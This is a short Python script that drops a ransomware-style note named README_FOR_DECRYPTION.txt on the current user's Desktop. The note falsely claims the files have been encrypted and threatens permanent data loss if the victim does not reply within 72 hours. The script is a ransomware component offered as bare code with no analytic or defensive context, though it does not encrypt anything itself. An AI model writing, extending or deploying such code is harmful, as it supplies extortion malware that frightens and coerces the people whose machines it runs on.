import os


def create_ransom_note():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    note_path = os.path.join(desktop_path, "README_FOR_DECRYPTION.txt")

    # Ransom note content
    ransom_note = (
        "Your files have been encrypted! "
        "\n\n"
        "Failure to communicate within 72 hours will result in permanent loss of data."
    )

    # Write the ransom note to a text file
    with open(note_path, "w") as file:
        file.write(ransom_note)


# Call the function to create the ransom note
create_ransom_note()
